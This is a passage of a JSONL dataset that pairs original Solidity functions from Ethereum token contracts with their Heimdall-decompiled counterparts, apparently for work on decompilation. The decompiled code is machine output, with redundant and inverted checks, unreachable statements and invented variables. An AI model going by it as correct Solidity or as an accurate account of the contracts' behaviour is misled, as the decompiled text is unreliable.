0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x69dfa326b4636d0d5D256CFEce392B25799daf3c", "original_solidity_code": "function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_a >> 0x01;\n                if (store_a) {\n                    if (store_a - ((store_a >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a >> 0x01) {\n                            if (0x1f < (store_a >> 0x01)) {\n                                var_a = 0x03;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x693E9C1e8935caf91F006bf5a2FF8a1aB2C569c7", "original_solidity_code": "function changeMagaPrinterGas(uint256 newGas) external onlyOwner {\r\n        magaPrinterGas = newGas;\r\n    }", "heimdall_decompiled_code": "function changeMagaPrinterGas(uint256 arg0) public {\n        require(msg.sender == (address(getOwner)), \"!Owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x06;\n        var_d = 0x214f776e65720000000000000000000000000000000000000000000000000000;\n        magaPrinterGas = arg0;\n    }"}
{"contract_address": "0xEA96F358096DB436A74f5C974F59fdE3Bc5185e7", "original_solidity_code": "function setMaxSize(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {\r\n        uint256 newTx = _supplyTotal.mul(_buy).div(10000); uint256 newTransfer = _supplyTotal.mul(_sell).div(10000); uint256 newWallet = _supplyTotal.mul(_wallet).div(10000);\r\n        _maxxTrxSize = newTx; _maxxTransferSize = newTransfer; _maxxWalletSize = newWallet;\r\n        uint256 limit = totalSupply().mul(5).div(1000);\r\n        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, \"Max TXs and Max Wallet cannot be less than .5%\");\r\n    }", "heimdall_decompiled_code": "function setMaxSize(uint256 arg0, uint256 arg1, uint256 arg2) public {\n        require(msg.sender == (address(getOwner)), \"Ownable: Caller is not owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1c;\n        var_d = 0x4f776e61626c653a2043616c6c6572206973206e6f74206f776e657200000000;\n        require((arg0 == ((arg0 * store_l) / store_l)) | !store_l);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x2710);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        require((arg1 == ((arg1 * store_l) / store_l)) | !store_l);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x2710);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        require((arg2 == ((arg2 * store_l) / store_l)) | !store_l);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x2710);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        _maxxTrxSize = (arg0 * store_l) / 0x2710;\n        _maxxTransferSize = (arg1 * store_l) / 0x2710;\n        _maxxWalletSize = (arg2 * store_l) / 0x2710;\n        var_g = 0x18;\n        var_e = 0xdead;\n        require(!(store_l - store_n) > store_l);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n    }"}
{"contract_address": "0x30045aA941FF9Be1d2D3603A75207C07860d4156", "original_solidity_code": "function transfer(address to, uint256 amount) external returns (bool);\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the remaining number of tokens that 'spender' will be\\r\\n     * allowed to spend on behalf of 'owner' through {transferFrom}", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"Max Buy Limit.\");\n        require(address(arg0), \"Max Buy Limit.\");\n        require(arg1 > 0, \"Max Buy Limit.\");\n        require(!(bytes1(inSwap / 0x010000)), \"Max Buy Limit.\");\n        require(!(initialDelayTime > (totalDelayTime + initialDelayTime)), \"Max Buy Limit.\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(!(block.timestamp < (totalDelayTime + initialDelayTime)), \"Max Buy Limit.\");\n        require(address(owner) == (address(msg.sender)), \"Max Buy Limit.\");\n        require(!(!(address(router)) == (address(arg0))), \"Max Buy Limit.\");\n        require(!(!(address(lpPair)) == (address(arg0))), \"Max Buy Limit.\");\n        require(!(!address(this) == (address(arg0))), \"Max Buy Limit.\");\n        require(!maxBuyLimit, \"Max Buy Limit.\");\n        require(!(arg1 > maxBuyLimit), \"Max Buy Limit.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x0e;\n        var_f = 0x4d617820427579204c696d69742e000000000000000000000000000000000000;\n        require(!(bytes1(inSwap / 0x0100)), \"_transfer:: Transfer Delay enabled.\");\n        require(!(tx.gasprice > maxGasPriceLimit), \"_transfer:: Transfer Delay enabled.\");\n        address var_a = msg.sender;\n        var_g = 0x1a;\n        require(!(block.timestamp < storage_map_f[var_a]), \"_transfer:: Transfer Delay enabled.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x5f7472616e736665723a3a205472616e736665722044656c617920656e61626c;\n        var_h = 0x65642e0000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x18;\n        var_f = 0x4761732070726963652065786365656473206c696d69742e0000000000000000;\n        if (address(owner) == (address(msg.sender))) {\n            if (address(owner) == (address(arg0))) {\n                if (!address(arg0)) {\n                    require(address(owner) == (address(msg.sender)), \"ERC20: transfer amount exceeds balance\");\n                    require(!(!(address(owner)) == (address(arg0))), \"ERC20: transfer amount exceeds balance\");\n                    require(!(address(arg0)), \"ERC20: transfer amount exceeds balance\");\n                    var_a = address(this);\n                    uint256 var_g = 0;\n                    require(!(!0xdead == (address(arg0))), \"ERC20: transfer amount exceeds balance\");\n                    require(!(!0xdead == (address(arg0))), \"ERC20: transfer amount exceeds balance\");\n                    require(!(!0xdead == (address(arg0))), \"ERC20: transfer amount exceeds balance\");\n                    require(!(!storage_map_f[var_a] < swapThreshold), \"ERC20: transfer amount exceeds balance\");\n                    require(!(!storage_map_f[var_a] < swapThreshold), \"ERC20: transfer amount exceeds balance\");\n                    require(!(!storage_map_f[var_a] < swapThreshold), \"ERC20: transfer amount exceeds balance\");\n                    var_a = address(msg.sender);\n                    var_g = 0x18;\n                    require(!(!storage_map_f[var_a] < swapThreshold), \"ERC20: transfer amount exceeds balance\");\n                    require(!(!storage_map_f[var_a] < swapThreshold), \"ERC20: transfer amount exceeds balance\");\n                    require(!(!storage_map_f[var_a] < swapThreshold), \"ERC20: transfer amount exceeds balance\");\n                    var_a = address(msg.sender);\n                    var_g = 0x19;\n                    require(bytes1(storage_map_f[var_a]), \"ERC20: transfer amount exceeds balance\");\n                    require(!(bytes1(storage_map_f[var_a])), \"ERC20: transfer amount exceeds balance\");\n                    var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                    var_b = 0x11;\n                    require(!0, \"ERC20: transfer amount exceeds balance\");\n                    require(!(0 > (uint16(_feesRates) + 0)), \"ERC20: transfer amount exceeds balance\");\n                    var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                    var_b = 0x11;\n                    require(!(uint16(_feesRates) + 0), \"ERC20: transfer amount exceeds balance\");\n                    var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                    var_b = 0x12;\n                    require((uint16(_feesRates) + 0) == (((uint16(_feesRates) + 0) * arg1) / arg1) | !arg1, \"ERC20: transfer amount exceeds balance\");\n                }\n                var_a = address(arg0);\n                var_g = 0x19;\n                require(0x2710, \"ERC20: transfer amount exceeds balance\");\n            }\n        }\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0), \"ERC20: transfer amount exceeds balance\");\n        var_a = address(msg.sender);\n        var_g = 0;\n        require(!(storage_map_f[var_a] < arg1), \"ERC20: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x26;\n        var_f = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_h = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_g = 0;\n        storage_map_f[var_a] = storage_map_f[var_a] - arg1;\n        var_a = address(arg0);\n        storage_map_f[var_a] = arg1 + storage_map_f[var_a];\n        uint256 var_c = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        require(!(!bytes1(inSwap)), \"ERC20: transfer amount exceeds balance\");\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0), \"ERC20: transfer amount exceeds balance\");\n        var_a = address(msg.sender);\n        var_g = 0;\n        require(!(storage_map_f[var_a] < arg1), \"ERC20: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x26;\n        var_f = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_h = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_g = 0;\n        storage_map_f[var_a] = storage_map_f[var_a] - arg1;\n        var_a = address(arg0);\n        storage_map_f[var_a] = arg1 + storage_map_f[var_a];\n        var_c = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_g = 0x19;\n        if (!storage_map_f[var_a]) {\n            var_a = address(arg0);\n            var_g = 0x19;\n            if (!storage_map_f[var_a]) {\n            }\n        }\n        inSwap = 0x01 | (uint248(inSwap));\n        var_a = address(this);\n        var_g = 0;\n        require(!platformFeeAmount);\n        require(!(storage_map_f[var_a] - platformFeeAmount) > storage_map_f[var_a]);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        platformFeeAmount = 0;\n        require(!store_q);\n        require(0x01 == store_q);\n        require(!(store_q - 0x01) > store_q);\n        require((store_q - 0x01) < store_q);\n        var_a = 0x07;\n        var_c = 0x02;\n        uint256 var_i = var_i + 0x60;\n        var_j = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x32;\n        address var_k = address(this);\n        var_l = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(router).WETH(var_h); // staticcall\n        var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x32;\n        uint256 var_m = address(var_i.length);\n        require(address(this));\n        require(address(router));\n        var_a = address(this);\n        var_g = 0x01;\n        var_a = address(router);\n        var_g = keccak256(var_a);\n        storage_map_f[var_a] = platformFeeAmount;\n        var_n = platformFeeAmount;\n        emit Approval(address(this), address(router), platformFeeAmount);\n        var_n = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        var_o = platformFeeAmount;\n        uint256 var_p = 0;\n        var_q = 0xa0;\n        uint256 var_r = var_i.length;\n        address var_s = address(storage_map_aa[var_a]);\n        uint256 var_t = block.timestamp;\n        require(address(router).code.length);\n        (bool success, bytes memory ret0) = address(router).{ value: platformFeeAmount ether }Unresolved_791ac947(var_o); // call\n        if (!store_q > 0x01) {\n            require(!(store_q > 0x01), \"ERC20: approve to the zero address\");\n            require(store_q, \"ERC20: approve to the zero address\");\n            require(!(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + store_q), \"ERC20: approve to the zero address\");\n            require(!(storage_map_f[var_a] - platformFeeAmount), \"ERC20: approve to the zero address\");\n            require(!buyBackPercent, \"ERC20: approve to the zero address\");\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        var_n = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_o = 0x20;\n        var_p = 0x22;\n        var_q = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_s = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_n = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_o = 0x20;\n        var_p = 0x24;\n        var_q = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_s = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x32;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        var_a = address(lpPair);\n        var_g = 0;\n        if (!storage_map_f[var_a] > 0) {\n            if (!storage_map_f[var_a] > 0) {\n                if (!storage_map_f[var_a] > 0) {\n                }\n            }\n        }\n        if (address(lpPair) == (address(msg.sender))) {\n        }\n        var_a = address(msg.sender);\n        var_g = 0x19;\n        require(!(bytes1(storage_map_f[var_a])), \"Buy transfer amount exceeds the maxTransactionAmount.\");\n        require(!(arg1 > maxTransactionAmount), \"Buy transfer amount exceeds the maxTransactionAmount.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x35;\n        var_f = 0x427579207472616e7366657220616d6f756e7420657863656564732074686520;\n        var_h = 0x6d61785472616e73616374696f6e416d6f756e742e0000000000000000000000;\n        var_a = address(arg0);\n        var_g = 0x19;\n        require(!(bytes1(storage_map_f[var_a])), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n        require(!(arg1 > maxTransactionAmount), \"Sell transfer amount exceeds the maxTransactionAmount.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x36;\n        var_f = 0x53656c6c207472616e7366657220616d6f756e74206578636565647320746865;\n        var_h = 0x206d61785472616e73616374696f6e416d6f756e742e00000000000000000000;\n        if (address(this) == (address(arg0))) {\n            if (address(this) == (address(arg0))) {\n            }\n        }\n        if (!address(arg0)) {\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x31;\n        var_f = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_h = 0x7468616e205a45524f5f41444452455353000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x2b;\n        var_f = 0x45524332303a207472616e7366657220746f20746865205a45524f5f41444452;\n        var_h = 0x4553532061646472657373000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x2d;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865205a45524f5f4144;\n        var_h = 0x4452455353206164647265737300000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xF6FF7F8635a951ecF4D68264b32FB3a4b5f9cf15", "original_solidity_code": "function isExcludedFromFees(address account) public view returns(bool) {\\r\\n        return _isExcludedFromFees[account];\\r\\n    }", "heimdall_decompiled_code": "function isExcludedFromFees(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x24;\n        address var_c = !(!bytes1(storage_map_r[var_a]));\n        return !(!bytes1(storage_map_r[var_a]));\n    }"}
{"contract_address": "0xfecd919dfC1b878E072959250dC8AAA25ea814A4", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"Only one transfer per block allowed.\");\n        require(address(arg0), \"Only one transfer per block allowed.\");\n        require(arg1 > 0, \"Only one transfer per block allowed.\");\n        require(address(owner) == (address(msg.sender)), \"Only one transfer per block allowed.\");\n        require(!(!(address(owner)) == (address(arg0))), \"Only one transfer per block allowed.\");\n        require(!(bytes1(transferDelayEnabled)), \"Only one transfer per block allowed.\");\n        require(address(store_c) == (address(arg0)), \"Only one transfer per block allowed.\");\n        require(!(!(address(store_d)) == (address(arg0))), \"Only one transfer per block allowed.\");\n        address var_a = tx.origin;\n        var_b = 0x05;\n        require(block.number > storage_map_e[var_a], \"Only one transfer per block allowed.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x4f6e6c79206f6e65207472616e736665722070657220626c6f636b20616c6c6f;\n        var_g = 0x7765642e00000000000000000000000000000000000000000000000000000000;\n        var_a = tx.origin;\n        var_b = 0x05;\n        storage_map_e[var_a] = block.number;\n        require(!(address(store_d) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_d) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_d) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_d) == (address(arg0))), \"SafeMath: addition overflow\");\n        require(!(address(store_d) == (address(arg0))), \"SafeMath: addition overflow\");\n        require(!(address(store_d) == (address(arg0))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(!bytes1(store_d / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_d / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_d / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_d / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_d / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_d / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_d / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!0, \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(storage_map_e[var_a] > (0 + storage_map_e[var_a])), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        require(!((0 + storage_map_e[var_a]) < storage_map_e[var_a]), \"SafeMath: addition overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x1b;\n        var_f = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_b = 0x01;\n        storage_map_e[var_a] = 0 + storage_map_e[var_a];\n        uint256 var_c = 0;\n        emit Transfer(address(msg.sender), address(this), 0);\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        require(address(msg.sender) - (address(transferDelayEnabled / 0x0100)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_i = 0x40 + var_i;\n        var_c = 0x1f;\n        var_j = 0x536166654d6174683a20207375627472616374696f6e206f766572666c6f7700;\n        require(!(arg1 > storage_map_e[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        uint256 var_g = var_i.length;\n        uint256 var_l = 0;\n        var_m = var_n;\n        var_l = 0;\n        if (!(storage_map_e[var_a] - arg1) > storage_map_e[var_a]) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_h = 0x11;\n            if (storage_map_e[var_a] > _maxTaxSwap) {\n            }\n            if (!store_g > store_h) {\n                if (!store_g > store_h) {\n                    if (!store_g > store_h) {\n                    }\n                }\n            }\n            if (!storage_map_e[var_a] > _taxSwapThreshold) {\n            }\n            require(!((storage_map_e[var_a] - arg1) > storage_map_e[var_a]), \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(!arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x19;\n        var_f = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        require(store_g > store_k, \"SafeMath: multiplication overflow\");\n        require(0 - arg1, \"SafeMath: multiplication overflow\");\n        require((store_l == ((store_l * arg1) / arg1)) | !arg1, \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((store_l * arg1) / arg1) == store_l, \"SafeMath: multiplication overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x21;\n        var_f = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_g = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        var_i = 0x40 + var_i;\n        var_c = 0x1a;\n        var_j = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        if (0x64) {\n            require(0x64);\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_h = 0x12;\n            require(0x64);\n            var_a = address(msg.sender);\n            var_b = 0x04;\n            require(!store_g > store_h);\n            var_a = address(this);\n            var_b = 0x01;\n            require(bytes1(storage_map_e[var_a]));\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x12;\n        if (0 - arg1) {\n        }\n        var_a = address(transferDelayEnabled / 0x0100);\n        var_b = 0x01;\n        require(storage_map_e[var_a] < _maxTaxSwap, \"Exceeds the _maxTxAmount.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x19;\n        var_f = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(this) == (address(msg.sender))) {\n            if (address(this) == (address(msg.sender))) {\n            }\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x19;\n        var_f = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(store_c) == (address(arg0))) {\n            if (address(store_c) == (address(arg0))) {\n            }\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x29;\n        var_f = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_g = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x361F35EDbe212107EcD63071D5255e477BB44e46", "original_solidity_code": "function getLatestPrice()\\n        public\\n        view\\n        returns (uint80, int, uint, uint, uint80)\\n    {\\n        // prettier-ignore\\n        (\\n            uint80 roundID,\\n            int price,\\n            uint startedAt,\\n            uint timeStamp,\\n            uint80 answeredInRound\\n        ) = priceFeed.latestRoundData();\\n\\n        return (roundID, price, startedAt, timeStamp, answeredInRound);\\n    }", "heimdall_decompiled_code": "function getLatestPrice() public payable returns (bytes memory) {\n        var_a = 0xfeaf968c00000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_e / 0x01).latestRoundData(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0xa0);\n        require(var_c.length == (uint80(var_c.length)));\n        require(var_d == (uint80(var_d)));\n        uint256 var_e = uint80(var_c.length);\n        var_f = var_g;\n        var_h = var_i;\n        var_j = var_k;\n        uint80 var_l = uint80(var_d);\n        return abi.encodePacked(uint80(var_c.length), var_m, var_n, var_o, uint80(var_p));\n    }"}
{"contract_address": "0x31218E25Ad864a39c1e3623a1F0e52f2E286E3b4", "original_solidity_code": "function isExcludedFromFee(address account) public view returns (bool) {\r\n        return _isExcludedFromFee[account];\r\n    }", "heimdall_decompiled_code": "function isExcludedFromFee(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x03;\n        address var_c = !(!bytes1(storage_map_a[var_a]));\n        return !(!bytes1(storage_map_a[var_a]));\n    }"}
{"contract_address": "0xaf820B5EA297f68B038B744AE2F5019B4fD2aC71", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: decreased allowance below zero\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77;\n        var_g = 0x207a65726f000000000000000000000000000000000000000000000000000000;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        uint256 var_c = storage_map_b[var_a] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] - arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
